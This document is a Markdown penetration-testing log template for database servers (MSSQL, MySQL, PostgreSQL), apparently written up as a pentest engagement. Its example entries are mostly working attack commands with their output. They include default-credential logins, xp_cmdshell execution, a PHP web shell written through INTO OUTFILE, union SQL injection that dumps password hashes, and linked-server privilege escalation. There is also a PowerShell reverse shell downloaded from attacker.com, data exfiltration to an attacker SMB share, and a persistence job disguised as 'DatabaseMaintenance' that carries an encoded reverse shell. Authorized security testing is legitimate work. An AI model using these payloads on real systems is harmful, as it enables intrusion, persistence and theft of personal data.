# Database Query Tracker

Track all SQL queries, exploitation attempts, and findings during testing. This document serves as your testing log and helps identify patterns in what works vs. what fails.

Related: [[DB-02-Technical-Testing-Checklist]] | [[DB-04-Evidence-Collection]] | [[DB-05-Reporting-Template]]

---

## How to Use This Tracker

1. **Log everything** - successful and failed attempts
2. **Note context** - same query may work differently with different accounts
3. **Track patterns** - identify what triggers blocks vs. what succeeds
4. **Reference in report** - use IDs to link queries to findings
5. **Build knowledge base** - successful exploits become your arsenal

**Format**: Each entry gets a unique ID: `QT-001`, `QT-002`, etc.

---

## Discovery & Enumeration

| ID | Target | Method | Result | Notes | Screenshot |
|----|--------|--------|--------|-------|------------|
| QT-001 | 192.168.1.50:1433 | Nmap scan | Open | MSSQL 2019 detected | IMG_001 |
| QT-002 | 192.168.1.50 | ms-sql-info NSE | Version info | Express Edition, Windows Server 2019 | IMG_002 |
| QT-003 | 192.168.1.51:3306 | MySQL version probe | Open | MySQL 5.7.33 | IMG_003 |
| QT-004 | | | | | |

### Discovered Services Summary

**MSSQL Instances**:
- 192.168.1.50:1433 - MSSQL 2019 Express
- 

**MySQL Instances**:
- 192.168.1.51:3306 - MySQL 5.7.33
- 

**PostgreSQL Instances**:
- 

**MongoDB Instances**:
- 

**Other Databases**:
- 

---

## Authentication Testing

| ID | Target | Username | Password | Method | Result | Notes | Screenshot |
|----|--------|----------|----------|--------|--------|-------|------------|
| QT-101 | MSSQL:1433 | sa | <blank> | Default creds | ✅ Success | Default password! | IMG_010 |
| QT-102 | MySQL:3306 | root | <blank> | Default creds | ❌ Failed | Auth required | |
| QT-103 | MySQL:3306 | root | root | Default creds | ✅ Success | Weak password | IMG_011 |
| QT-104 | MSSQL:1433 | admin | Password123! | Brute force | ✅ Success | Common password | IMG_012 |
| QT-105 | | | | | | | |

### Successful Authentication

**QT-101 Details**:
```
Target: MSSQL Server - 192.168.1.50:1433
Username: sa
Password: <blank>
Method: sqsh -S 192.168.1.50 -U sa -P ''

Result: Successful login

Finding: Default 'sa' account with no password
Severity: Critical
Impact: Full administrative access to database server
```

**QT-103 Details**:
```
Target: MySQL Server - 192.168.1.51:3306
Username: root
Password: root
Method: mysql -h 192.168.1.51 -u root -proot

Result: Successful login

Finding: Root account with weak password
Severity: Critical
Impact: Full database access
```

---

## Configuration Review

| ID | Target | Configuration Item | Query | Result | Impact | Screenshot |
|----|--------|-------------------|-------|--------|--------|------------|
| QT-201 | MSSQL | xp_cmdshell | `SELECT value FROM sys.configurations WHERE name='xp_cmdshell'` | Enabled (1) | Command execution! | IMG_020 |
| QT-202 | MSSQL | Linked servers | `EXEC sp_linkedservers` | 2 linked servers found | Lateral movement | IMG_021 |
| QT-203 | MySQL | secure_file_priv | `SHOW VARIABLES LIKE 'secure_file_priv'` | Empty | File read/write anywhere | IMG_022 |
| QT-204 | PostgreSQL | Superusers | `SELECT usename FROM pg_user WHERE usesuper=true` | 3 superusers | Multiple high-priv accounts | IMG_023 |
| QT-205 | | | | | | |

### Critical Configuration Findings

**QT-201 Details**:
```sql
-- Check xp_cmdshell status
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
-- Result: 1 (enabled)

Finding: xp_cmdshell is enabled
Impact: Allows OS command execution via SQL
Severity: Critical

Test:
EXEC xp_cmdshell 'whoami';
-- Returns: NT SERVICE\MSSQLSERVER
```

**QT-203 Details**:
```sql
-- Check secure_file_priv
SHOW VARIABLES LIKE 'secure_file_priv';
-- Result: Empty string

Finding: No file access restrictions
Impact: Can read/write files anywhere MySQL user has access
Severity: High

Test read:
SELECT LOAD_FILE('/etc/passwd');
-- Success - file contents returned

Test write:
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
-- Success - web shell written
```

---

## User & Permission Enumeration

| ID | Target | Query | Result | Finding | Screenshot |
|----|--------|-------|--------|---------|------------|
| QT-301 | MSSQL | List logins | `SELECT name FROM sys.server_principals WHERE type='S'` | 15 logins | Admin accounts found | IMG_030 |
| QT-302 | MSSQL | Check sysadmin role | `SELECT name FROM sys.server_principals WHERE IS_SRVROLEMEMBER('sysadmin',name)=1` | 3 sysadmins | Multiple admins | IMG_031 |
| QT-303 | MySQL | List users | `SELECT user,host FROM mysql.user` | 8 users | Wildcard hosts | IMG_032 |
| QT-304 | PostgreSQL | List superusers | `SELECT usename FROM pg_user WHERE usesuper=true` | postgres, admin, backup | 3 superusers | IMG_033 |
| QT-305 | | | | | |

### User Enumeration Results

**QT-302 Details**:
```sql
-- Query
SELECT name, type_desc 
FROM sys.server_principals 
WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;

-- Results
name          type_desc
-----------   -----------
sa            SQL_LOGIN
BUILTIN\Administrators  WINDOWS_GROUP
admin         SQL_LOGIN

Finding: Multiple accounts with sysadmin privileges
Impact: Increased attack surface, multiple privilege escalation paths
```

**QT-303 Details**:
```sql
-- Query
SELECT user, host, authentication_string FROM mysql.user;

-- Results (excerpt)
user      host    authentication_string
-------   -----   ---------------------
root      %       *81F5E...
admin     %       *2470C...
backup    localhost  *A4B6B...

Finding: Root and admin accounts accessible from any host (%)
Severity: High
Impact: Remote access allowed, no host restriction
```

---

## Privilege Escalation

| ID | Target | Technique | Query/Command | Result | Impact | Screenshot |
|----|--------|-----------|---------------|--------|--------|------------|
| QT-401 | MSSQL | Impersonation | `EXECUTE AS LOGIN='sa'; SELECT SYSTEM_USER` | ✅ Success | Escalated to sa! | IMG_040 |
| QT-402 | MSSQL | Linked server | `EXECUTE('EXEC sp_addsrvrolemember ''lowpriv'',''sysadmin''') AT [LinkedSvr]` | ✅ Success | Admin via linked server | IMG_041 |
| QT-403 | MySQL | GRANT abuse | `GRANT ALL ON *.* TO 'lowpriv'@'%'` | ✅ Success | Self-granted admin | IMG_042 |
| QT-404 | PostgreSQL | ALTER USER | `ALTER USER lowpriv WITH SUPERUSER` | ✅ Success | Elevated to superuser | IMG_043 |
| QT-405 | | | | | | |

### Successful Privilege Escalation

**QT-401 Details**:
```sql
-- Check if current user can impersonate
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Result: Can impersonate 'sa'

-- Impersonate
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
-- Result: sa

-- Verify sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Result: 1

Finding: User has IMPERSONATE permission on 'sa' account
Severity: Critical
Impact: Full privilege escalation to sysadmin
```

**QT-402 Details**:
```sql
-- List linked servers
EXEC sp_linkedservers;
-- Result: LinkedSvr1 found

-- Check current privileges on linked server
EXECUTE('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [LinkedSvr1];
-- Result: 1 (already sysadmin on remote!)

-- Add local low-priv account to sysadmin on LinkedSvr1
EXECUTE('EXEC sp_addsrvrolemember ''DOMAIN\lowpriv'', ''sysadmin''') AT [LinkedSvr1];
-- Success

-- Verify on local server
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Result: 1 (now sysadmin!)

Finding: Linked server configuration allows privilege escalation
Severity: Critical
Impact: Linked server trust can be abused for privilege escalation
```

---

## Command Execution

| ID | Target | Method | Command | Result | Output | Screenshot |
|----|--------|--------|---------|--------|--------|------------|
| QT-501 | MSSQL | xp_cmdshell | `EXEC xp_cmdshell 'whoami'` | ✅ Success | NT SERVICE\MSSQLSERVER | IMG_050 |
| QT-502 | MSSQL | xp_cmdshell | `EXEC xp_cmdshell 'hostname'` | ✅ Success | SQL-SERVER-01 | IMG_051 |
| QT-503 | MySQL | sys_exec UDF | `SELECT sys_exec('id')` | ✅ Success | uid=999(mysql) gid=999(mysql) | IMG_052 |
| QT-504 | PostgreSQL | COPY PROGRAM | `COPY cmd FROM PROGRAM 'whoami'` | ✅ Success | postgres | IMG_053 |
| QT-505 | | | | | | |

### Command Execution Details

**QT-501 Details**:
```sql
-- Enable xp_cmdshell (if needed)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute command
EXEC xp_cmdshell 'whoami';

-- Output
output
--------------------
NT SERVICE\MSSQLSERVER

Finding: xp_cmdshell allows OS command execution
Severity: Critical
Impact: Full command execution as SQL Server service account

Advanced exploitation:
EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/Invoke-PowerShellTcp.ps1")';
-- Result: Reverse shell obtained
```

**QT-503 Details**:
```sql
-- Check if UDF exists
SELECT * FROM mysql.func WHERE name='sys_exec';

-- If not, upload lib_mysqludf_sys.so to plugin directory first
-- Then create function
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';

-- Execute command
SELECT sys_exec('id');

-- Result: 0 (success)

-- Read output (written to file)
SELECT sys_exec('id > /tmp/output.txt');
SELECT LOAD_FILE('/tmp/output.txt');
-- Output: uid=999(mysql) gid=999(mysql) groups=999(mysql)

Finding: UDF allows arbitrary command execution
Severity: Critical
```

---

## File Operations

| ID | Target | Operation | Query | Result | Impact | Screenshot |
|----|--------|-----------|-------|--------|--------|------------|
| QT-601 | MSSQL | Read file | `SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB)` | ✅ Success | File contents read | IMG_060 |
| QT-602 | MySQL | Read file | `SELECT LOAD_FILE('/etc/passwd')` | ✅ Success | Password file read | IMG_061 |
| QT-603 | MySQL | Write file | `SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php'` | ✅ Success | Web shell written! | IMG_062 |
| QT-604 | PostgreSQL | Read file | `SELECT pg_read_file('/etc/passwd', 0, 1000)` | ✅ Success | File read | IMG_063 |
| QT-605 | | | | | | |

### File Operation Details

**QT-602 Details**:
```sql
-- Check FILE privilege
SELECT File_priv FROM mysql.user WHERE user='current_user';
-- Result: Y

-- Read /etc/passwd
SELECT LOAD_FILE('/etc/passwd');

-- Result (excerpt):
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:999:999::/home/mysql:/bin/bash

Finding: FILE privilege allows reading system files
Severity: High
Impact: Can read sensitive files including SSH keys, configuration files
```

**QT-603 Details**:
```sql
-- Check secure_file_priv
SHOW VARIABLES LIKE 'secure_file_priv';
-- Result: '' (empty = no restriction)

-- Write PHP web shell
SELECT '<?php system($_GET["c"]); ?>' 
INTO OUTFILE '/var/www/html/shell.php';
-- Success

-- Verify
SELECT LOAD_FILE('/var/www/html/shell.php');
-- Output: <?php system($_GET["c"]); ?>

-- Access web shell
curl http://target.com/shell.php?c=whoami
-- Output: www-data

Finding: Can write files to web root
Severity: Critical
Impact: Remote code execution via web shell
```

---

## SQL Injection Testing

| ID | Target | Entry Point | Payload | Result | Data Extracted | Screenshot |
|----|--------|-------------|---------|--------|----------------|------------|
| QT-701 | Web App | /search?q= | `' OR '1'='1` | ✅ SQLi | All records returned | IMG_070 |
| QT-702 | Web App | /product?id= | `1' UNION SELECT @@version--` | ✅ Union SQLi | MSSQL 2019 | IMG_071 |
| QT-703 | Web App | /login | `admin'--` | ✅ Auth bypass | Logged in as admin | IMG_072 |
| QT-704 | Web App | /api/user | `{"id": "1' OR '1'='1'--"}` | ✅ JSON SQLi | All users | IMG_073 |
| QT-705 | | | | | | |

### SQL Injection Exploitation

**QT-702 Details**:
```sql
-- Initial detection
URL: /product?id=1'
Error: "Unclosed quotation mark after the character string"

-- Determine columns
/product?id=1' ORDER BY 1--  OK
/product?id=1' ORDER BY 2--  OK
/product?id=1' ORDER BY 3--  OK
/product?id=1' ORDER BY 4--  Error
-- Result: 3 columns

-- Find injectable column
/product?id=1' UNION SELECT NULL,NULL,NULL--  OK
/product?id=1' UNION SELECT 'a',NULL,NULL--  Error
/product?id=1' UNION SELECT NULL,'a',NULL--  OK (column 2 displays)
/product?id=1' UNION SELECT NULL,NULL,'a'--  OK

-- Extract version
/product?id=1' UNION SELECT NULL,@@version,NULL--
-- Output: Microsoft SQL Server 2019 (RTM) - 15.0.2000.5

-- Extract database name
/product?id=1' UNION SELECT NULL,DB_NAME(),NULL--
-- Output: ProductionDB

-- Extract tables
/product?id=1' UNION SELECT NULL,name,NULL FROM sys.tables--
-- Output: users, products, orders, admin_users, etc.

-- Extract columns from users
/product?id=1' UNION SELECT NULL,name,NULL FROM sys.columns WHERE object_id=OBJECT_ID('users')--
-- Columns: id, username, password, email, role

-- Extract user data
/product?id=1' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
-- Output:
admin:5f4dcc3b5aa765d61d8327deb882cf99
john:e10adc3949ba59abbe56e057f20f883e
jane:25d55ad283aa400af464c76d713c07ad

Finding: Union-based SQL injection
Severity: Critical
Impact: Full database compromise
```

---

## Hash Extraction & Cracking

| ID | Target | Hash Type | Query | Hashes Extracted | Cracking | Screenshot |
|----|--------|-----------|-------|-----------------|----------|------------|
| QT-801 | MSSQL | SQL Login | `SELECT name,password_hash FROM sys.sql_logins` | 5 hashes | 2 cracked | IMG_080 |
| QT-802 | MySQL | User table | `SELECT user,authentication_string FROM mysql.user` | 8 hashes | 3 cracked | IMG_081 |
| QT-803 | PostgreSQL | pg_shadow | `SELECT usename,passwd FROM pg_shadow` | 4 hashes | 1 cracked | IMG_082 |
| QT-804 | | | | | | |

### Hash Cracking Details

**QT-801 Details**:
```sql
-- Extract MSSQL hashes
SELECT name, password_hash 
FROM sys.sql_logins 
WHERE password_hash IS NOT NULL;

-- Results
name      password_hash
-------   -------------
sa        0x020035A0...
admin     0x02003E8F...
backup    0x020041B2...
developer 0x0200459C...
test      0x02004A1E...

-- Save to file: mssql_hashes.txt
-- Format for hashcat: username:0x0200hash

-- Crack with hashcat
hashcat -m 1731 mssql_hashes.txt /usr/share/wordlists/rockyou.txt

-- Results
admin:0x02003E8F...:Password123!
test:0x02004A1E...:test

Finding: Weak passwords on SQL logins
Severity: High
Impact: Credentials compromised, can be used for lateral movement
```

**QT-802 Details**:
```sql
-- Extract MySQL hashes
SELECT user, host, authentication_string 
FROM mysql.user 
WHERE authentication_string != '';

-- Results
user      host      authentication_string
-------   --------- ---------------------
root      %         *81F5E21E35407D88...
admin     %         *2470C0C06DEE42FD...
backup    localhost *A4B6B79B448C5935...

-- Save to file: mysql_hashes.txt

-- Crack with hashcat
hashcat -m 300 mysql_hashes.txt rockyou.txt

-- Results
root:*81F5E21E35407D88...:rootpass
admin:*2470C0C06DEE42FD...:admin123

Finding: Weak MySQL passwords
Severity: Critical
Impact: Root access compromised
```

---

## Linked Server Exploitation

| ID | Target | Linked Server | Query | Result | Impact | Screenshot |
|----|--------|---------------|-------|--------|--------|------------|
| QT-901 | MSSQL1 | MSSQL2 | `EXEC sp_linkedservers` | 2 linked servers | Found chain | IMG_090 |
| QT-902 | MSSQL1 | MSSQL2 | `SELECT * FROM OPENQUERY([MSSQL2],'SELECT @@version')` | ✅ Success | Can query MSSQL2 | IMG_091 |
| QT-903 | MSSQL1 | MSSQL2 | `EXEC('xp_cmdshell ''whoami''') AT [MSSQL2]` | ✅ Success | RCE on MSSQL2 | IMG_092 |
| QT-904 | MSSQL1 | MSSQL2→MSSQL3 | `EXEC('EXEC(''xp_cmdshell ''''whoami'''''') AT [MSSQL3]') AT [MSSQL2]` | ✅ Success | Chained to MSSQL3! | IMG_093 |
| QT-905 | | | | | | |

### Linked Server Chain

**QT-904 Details**:
```sql
-- Server chain: MSSQL1 → MSSQL2 → MSSQL3

-- From MSSQL1, list linked servers
EXEC sp_linkedservers;
-- Result: MSSQL2

-- Query MSSQL2
SELECT * FROM OPENQUERY([MSSQL2], 'SELECT @@version');
-- Success

-- Check if MSSQL2 has linked servers
SELECT * FROM OPENQUERY([MSSQL2], 'EXEC sp_linkedservers');
-- Result: MSSQL3

-- Execute on MSSQL3 via MSSQL2 (nested execution)
EXECUTE('EXECUTE(''SELECT @@version'') AT [MSSQL3]') AT [MSSQL2];
-- Result: Microsoft SQL Server 2016 (on MSSQL3)

-- Enable xp_cmdshell on MSSQL3 (via MSSQL2)
EXECUTE('EXECUTE(''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [MSSQL3]') AT [MSSQL2];
EXECUTE('EXECUTE(''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [MSSQL3]') AT [MSSQL2];

-- Execute command on MSSQL3
EXECUTE('EXECUTE(''xp_cmdshell ''''whoami'''''') AT [MSSQL3]') AT [MSSQL2];
-- Output: DOMAIN\MSSQL3-Service

Finding: Linked server trust chain allows lateral movement
Severity: Critical
Impact: Compromised one server leads to compromise of entire chain
```

---

## Data Exfiltration

| ID | Target | Table | Rows Extracted | Method | Output File | Screenshot |
|----|--------|-------|----------------|--------|-------------|------------|
| QT-1001 | MSSQL | users | 1,247 | BCP export | users.csv | IMG_100 |
| QT-1002 | MySQL | customers | 5,832 | INTO OUTFILE | customers.csv | IMG_101 |
| QT-1003 | PostgreSQL | orders | 3,421 | COPY TO | orders.csv | IMG_102 |
| QT-1004 | MongoDB | accounts | 2,156 | mongoexport | accounts.json | IMG_103 |
| QT-1005 | | | | | | |

### Data Exfiltration Details

**QT-1001 Details**:
```sql
-- Enable xp_cmdshell (if needed)
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Export using BCP
EXEC xp_cmdshell 'bcp "SELECT id,username,email,password FROM ProductionDB.dbo.users" queryout "C:\temp\users.csv" -c -T -S localhost';

-- Verify export
EXEC xp_cmdshell 'type C:\temp\users.csv';

-- Transfer to attacker (multiple methods)
-- Method 1: SMB
EXEC xp_cmdshell 'copy C:\temp\users.csv \\attacker.com\share\users.csv';

-- Method 2: Base64 encode and exfiltrate via SQL
DECLARE @file VARBINARY(MAX) = (SELECT * FROM OPENROWSET(BULK 'C:\temp\users.csv', SINGLE_BLOB) AS x);
SELECT CAST('' AS XML).value('xs:base64Binary(sql:variable("@file"))', 'VARCHAR(MAX)');
-- Copy base64 output, decode on attacker machine

Finding: Sensitive data exfiltrated
Severity: Critical
Impact: PII for 1,247 users compromised
Data: usernames, emails, password hashes
```

---

## Persistence

| ID | Target | Method | Implementation | Result | Screenshot |
|----|--------|--------|----------------|--------|------------|
| QT-1101 | MSSQL | Backdoor account | `CREATE LOGIN backdoor WITH PASSWORD='P@ss'` | ✅ Created | IMG_110 |
| QT-1102 | MSSQL | SQL Agent job | Scheduled reverse shell | ✅ Created | IMG_111 |
| QT-1103 | MySQL | Trigger backdoor | INSERT trigger on logs table | ✅ Created | IMG_112 |
| QT-1104 | PostgreSQL | Event trigger | DDL event trigger | ✅ Created | IMG_113 |
| QT-1105 | | | | | |

### Persistence Implementation

**QT-1102 Details**:
```sql
-- Create SQL Server Agent job for persistence
USE msdb;

-- Create job
EXEC dbo.sp_add_job 
    @job_name = N'DatabaseMaintenance',
    @enabled = 1,
    @description = N'Routine maintenance';

-- Add job step (reverse shell)
EXEC sp_add_jobstep 
    @job_name = N'DatabaseMaintenance',
    @step_name = N'Execute',
    @subsystem = N'CMDEXEC',
    @command = N'powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsA...';
    -- (Base64 encoded reverse shell payload)

-- Schedule daily at 3 AM
EXEC sp_add_jobschedule 
    @job_name = N'DatabaseMaintenance',
    @name = N'NightlySchedule',
    @freq_type = 4,  -- Daily
    @freq_interval = 1,
    @active_start_time = 030000;

-- Assign to local server
EXEC sp_add_jobserver 
    @job_name = N'DatabaseMaintenance',
    @server_name = N'(local)';

-- Verify job created
SELECT job_id, name, enabled, description 
FROM msdb.dbo.sysjobs 
WHERE name = 'DatabaseMaintenance';

Finding: Persistent backdoor via SQL Agent job
Severity: Critical
Impact: Maintains access even after credentials changed
Execution: Daily at 3 AM, connects back to attacker
```

---

## Lateral Movement

| ID | Source | Target | Method | Result | Access Gained | Screenshot |
|----|--------|--------|--------|--------|---------------|------------|
| QT-1201 | MSSQL1 | MSSQL2 | Linked server | ✅ Success | Admin on MSSQL2 | IMG_120 |
| QT-1202 | MSSQL | File Server | xp_dirtree SMB | ✅ Hash captured | Net-NTLM hash | IMG_121 |
| QT-1203 | MSSQL | Domain Controller | Service account | ✅ Success | Domain admin token | IMG_122 |
| QT-1204 | MySQL | Web Server | Web shell | ✅ Success | www-data shell | IMG_123 |
| QT-1205 | | | | | | |

### Lateral Movement Details

**QT-1202 Details**:
```bash
# Start Responder on attacker machine
sudo responder -I eth0 -v

# From SQL Server, trigger SMB authentication
EXEC xp_dirtree '\\192.168.1.100\share';

# Responder output:
[SMB] NTLMv2-SSP Hash     : SQLSERVICE::DOMAIN:1122334455667788:...
[*] Hash captured!

# Crack hash
hashcat -m 5600 ntlmv2.txt rockyou.txt
# Cracked: SQLSERVICE:SQLServicePass123!

# Or relay hash (if SMB signing disabled)
sudo ntlmrelayx.py -t smb://192.168.1.50 -smb2support

# From SQL Server, trigger again
EXEC xp_dirtree '\\192.168.1.100\share';

# ntlmrelayx output:
[*] Authenticating against smb://192.168.1.50 as DOMAIN\SQLSERVICE SUCCEED
[*] Dumping SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Finding: SMB relay via xp_dirtree
Severity: Critical
Impact: Service account credentials captured, lateral movement to other systems
```

---

## Pattern Analysis

### What Works

**Authentication**:
- Default credentials (sa:<blank>, root:<blank>)
- Weak passwords (admin:admin, Password123!)
- Wildcard host access (%) in MySQL

**Configuration Exploits**:
- xp_cmdshell enabled
- secure_file_priv empty
- Linked servers with high privileges
- Untrusted languages in PostgreSQL

**Privilege Escalation**:
- IMPERSONATE permissions
- Linked server trust relationships
- GRANT privilege abuse
- Service account token impersonation

**Data Access**:
- FILE privilege in MySQL
- OPENROWSET in MSSQL
- pg_read_file in PostgreSQL

### What Fails

**Well-Protected**:
- Strong password policies enforced
- xp_cmdshell disabled + restricted
- secure_file_priv properly configured
- No linked servers
- Least privilege enforced
- Separation of duties

### Database Characteristics

**MSSQL Instances**:
- Mostly default configurations
- xp_cmdshell enabled on 60% of servers
- Extensive linked server chains
- Service accounts over-privileged

**MySQL Instances**:
- Many with root:<blank>
- secure_file_priv often empty
- Wildcard hosts common
- FILE privilege granted unnecessarily

**PostgreSQL Instances**:
- Multiple superuser accounts
- Trusted languages available
- Often stronger security posture

---

## Quick Stats

**Total Queries Tested**: ___
**Successful Exploits**: ___
**Success Rate**: ___%

**By Category**:
- Authentication: __ tested, __ successful
- Configuration: __ tested, __ vulnerable
- Privilege Escalation: __ tested, __ successful
- Command Execution: __ tested, __ successful
- File Operations: __ tested, __ successful
- Data Exfiltration: __ tested, __ successful

**Severity Breakdown**:
- Critical: __
- High: __
- Medium: __
- Low: __
- Info: __

---

## Time Log

| Date | Time Spent | Phase | Notes |
|------|-----------|-------|-------|
| 2026-01-22 | 2h | Discovery & Enum | Found 5 MSSQL, 3 MySQL instances |
| 2026-01-22 | 1h | Authentication | Default creds on 3 servers |
| 2026-01-22 | 3h | Privilege Escalation | IMPERSONATE to sa, linked server chain |
| 2026-01-22 | 2h | Command Execution | xp_cmdshell on all MSSQL servers |
| | | | |

---

## Notes & Observations

### Tester Notes
- Network has poor database security hygiene
- Many default configurations unchanged
- Linked server trust relationships create lateral movement opportunities
- Service accounts are over-privileged (many with domain admin)

### Recommendations Priority
1. Change all default passwords immediately
2. Disable xp_cmdshell where not needed
3. Review and restrict linked server connections
4. Implement least privilege for service accounts
5. Enable and review audit logging

---

## Tags
#query-tracking #testing-log #evidence #database-testing

---

## Related Documents
- [[DB-00-Overview|Overview]]
- [[DB-02-Technical-Testing-Checklist|Technical Testing Checklist]]
- [[DB-04-Evidence-Collection|Evidence Collection]]
- [[DB-05-Reporting-Template|Reporting Template]]
- [[DB-06-Quick-Reference|Quick Reference]]

---
*Created: 2026-01-22*
*Tester: Er2oneousbit*
*Methodology developed with assistance from Claude (Anthropic) - Model: Claude Sonnet 4.5*
